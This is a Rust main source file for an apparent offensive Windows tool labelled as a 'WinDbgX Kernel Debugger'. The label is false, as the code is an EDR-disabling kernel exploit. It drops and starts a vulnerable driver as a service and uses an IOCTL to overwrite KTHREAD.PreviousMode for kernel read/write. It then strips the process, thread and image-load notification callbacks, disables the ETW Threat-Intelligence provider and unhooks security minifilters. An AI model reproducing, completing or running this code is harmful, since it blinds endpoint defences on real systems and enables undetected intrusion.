use std::{thread, time};
use std::ffi::{c_void};

mod utils;
mod svc;
mod pdb;
mod km;
mod xp;
mod mem;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("[+] =-=-=- WinDbgX Kernel Debugger -=-=-=");
    println!("[>] Setting up the environment...");
    

    // =-=-> Get Windows version and feature support (IORINGs). No Win7 or earlier...
    let ioring_supported = utils::version_check_and_do_we_have_ioring();
    if ioring_supported {
        println!("[*] IORING support not available yet. Exiting for safety as this could crash...");
        std::process::exit(1);
    }


    // =-=-> Sleeping...
    //   - TKTK: do custom sleep that checks for PPID and/or checks for a specific cadence
    println!("[*] Waiting for the opportune moment...");
    let bo_do_bleep = time::Duration::from_millis(100);
    thread::sleep(bo_do_bleep);


    // =-=-> Get offsets for this version of Windows
    // Get symbol file information
    println!("[>] Downloading symbol files to memory.");
    let ntos: String = "C:\\Windows\\System32\\ntoskrnl.exe".to_string();
    let fltmgr: String = "C:\\Windows\\System32\\drivers\\fltmgr.sys".to_string();    
    let nt_url = match pdb::pdb_symbol_url(ntos) {
        Ok(url) => url,
        Err(e) => {
            eprintln!("[!] Failed to get PDB URL for NTOS: {}", e);
            std::process::exit(1);
        }
    };
    let fltmgr_url = match pdb::pdb_symbol_url(fltmgr) {
        Ok(url) => url,
        Err(e) => {
            eprintln!("[!] Failed to get PDB URL for FLTMGR: {}", e);
            std::process::exit(-1);
        }
    };
    // Download symbol files
    let mut nt_pdb = utils::download_pdb(&nt_url)?;
    let mut fm_pdb = utils::download_pdb(&fltmgr_url)?;
    // Parse symbol files for offsets
    let nt_offsets;
    let fm_offsets;
    match pdb::get_nt_offsets(&mut nt_pdb) {
        Ok(offsets) => {
            nt_offsets = offsets; // bind to outer var
        }
        Err(e) => {
            eprintln!("[-] Failed to parse NT offsets: {}", e);
            std::process::exit(-1);
        }
    }
    match pdb::get_fm_offsets(&mut fm_pdb) {
        Ok(offsets) => {
            fm_offsets = offsets; // bind to outer var
        }
        Err(e) => {
            eprintln!("[-] Failed to parse FM offsets: {}", e);
            std::process::exit(-1);
        }
    }

    // Get base addresses for target kernel modules
    let nt_base;
    let fm_base;
    match km::get_driver_base("ntoskrnl.exe") {
        Some(base) => {
            nt_base = base;
            println!("[+] NT base address: {:?}", nt_base);
        },
        None => {
            println!("[!] Could not find base address for ntoskrnl.exe!");
            println!("[-] Tool must be run from Medium integrity on versions before 24H2, or High integrity on 24H2+. (PS, try running from PowerShell...)");
            std::process::exit(-1);
        }
    }
    match km::get_driver_base("fltmgr.sys") {
        Some(base) => {
            fm_base = base;
            println!("[+] FM base address: {:?}", fm_base);
        },
        None => {
            println!("[!] Could not find base address for fltmgr.sys!");
            println!("[-] Tool must be run from Medium integrity on versions before 24H2, or High integrity on 24H2+. (PS, try running from PowerShell...)");
            std::process::exit(-1);
        }
    }
    

    // =-=-> Get a handle to the vuln driver. If fails, write the driver and start service.
    let h_drv;
    match xp::get_driver_handle() {
        Ok(_handle) => { }
        Err(err) => {
            eprintln!("[-] Could not get handle, error: {}. Need to download...", err);
            let svc_name = "umpass";
            let bin_path = r"\\??\\C:\\um_pass.sys"; // escaped backslashes
            svc::write_embedded_file("C:\\um_pass.sys")?;
            // Try modifying the registry first
            svc::modify_svc_reg(svc_name, bin_path)
                .expect("[!] Failed to modify service registry for umpass, trying something different (TKTK - need to add)");
            // If registry modification succeeds, start the service
            svc::start_svc(svc_name)
                .expect("[!] Failed to start service");
        }
    }
    match xp::get_driver_handle() {
        Ok(handle) => {
            h_drv = handle;
        }
        Err(err) => {
            eprintln!("[-] Could not get handle, error: {}. Did not start service...exiting.", err);
            std::process::exit(-1);
        }
    }
    println!("[+] Got driver handle: {:?}", h_drv);

    // =-=-> Overwrite KTHREAD.PreviousMode for kernel RW
    let thread_addr: Option<*mut c_void> = km::get_thread_info();
    let pm: Option<*mut u8>;

    if let Some(ptr) = thread_addr {
        let addr = ptr as usize;
        let pm_offset = nt_offsets.modus_previosa as usize;
        pm = Some((addr + pm_offset) as *mut u8);
        println!("[+] Thread pointer [{:p}] - Modus Previosa [{:p}]", ptr, pm.unwrap());
    } else {
        println!("[!] Failed to get thread info");
        std::process::exit(-1);
    }

    // Send the exploit to overwrite PM
    unsafe {
        xp::send_ioctl_to_driver(
            h_drv,
            pm.unwrap() as usize as u64,
            0x1,
        );
    }


    // =-=-> Remove Process Creation Notification callback
    println!("[>] Removing notification callbacks:");
    let process_create_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_create_process_notify_routine as u64)};
    let thread_create_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_create_thread_notify_routine as u64)};
    let img_load_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_load_image_notify_routine as u64)};
    
    match xp::nerf_cb(process_create_notify_base, "PspCreateProcessNotifyRoutine") {
        Ok(_val) => {},
        Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
    }
    match xp::nerf_cb(thread_create_notify_base, "PspCreateThreadNotifyRoutine") {
        Ok(_val) => {},
        Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
    }
    match xp::nerf_cb(img_load_notify_base, "PspLoadImageNotifyRoutine") {
        Ok(_val) => {},
        Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
    }


    // =-=-> Disable Etw-Ti provider
    let prov_status: u64;
    let ti_handle = {(nt_base as u64).wrapping_add(nt_offsets.threat_int_prov_reg_handle as u64)};
    match xp::nerf_etw_prov(
        ti_handle, 
        "Etw-Ti", 
        nt_offsets.guid_entry, 
        nt_offsets.prov_enable_info) 
        {
        Ok(val) => {
            prov_status = val;
            println!("[*] Etw-Ti Provider enabled status: 0x{:x}", prov_status);
        }
        Err(e) => eprintln!("[-] Failed to read ETW provider: {:?}", e),
    }


    // =-=-> Unhook EDR file system minifilter entries
    println!("[>] Targeting the file system minifilters.");
    match xp::nerf_fs_miniflts(fm_base as u64, fm_offsets) {
        Ok(_val) => {},
        Err(e) => eprintln!("[-] FS miniflt nerfing failed: {:?}", e),
    }



    // =-=-> Clean up: Write 0x1 back to PM. Can't read it again! :D
    mem::write_byte(pm.unwrap() as usize as u64, 0x1);

    utils::is_edr_dll_loaded(4);

    // Pause & exit
    println!("");
    Ok(())
}

